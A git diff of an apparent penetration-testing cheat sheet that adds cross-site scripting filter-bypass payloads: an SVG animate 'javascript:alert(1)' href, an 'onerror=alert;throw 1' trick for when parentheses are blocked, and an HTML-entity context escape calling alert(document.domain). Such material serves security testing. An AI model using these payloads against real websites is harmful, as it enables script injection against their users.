@@ -12,7 +12,7 @@ In the case where the context is in a script tag , you can simply close the tag 
 
 
 Used to Bypass a filter that blocks some tags and attributes , you can use the following payloads to execute your script :
-
+````
 <svg>
 	<a>
 	<animate attributeName="href" values="javascript:alert(1)"/>
@@ -22,4 +22,14 @@ Used to Bypass a filter that blocks some tags and attributes , you can use the f
 </a>
 </svg>
 
+````
+
+In cases were some characters like parenthesis are not allowed, you can use the throw statement with an exception handler 
+
+```` onerror=alert;throw 1 ````
+
+
+using HTML entity to bypass context : 
+
+```` &apos;-alert(document.domain)-&apos; ````
 
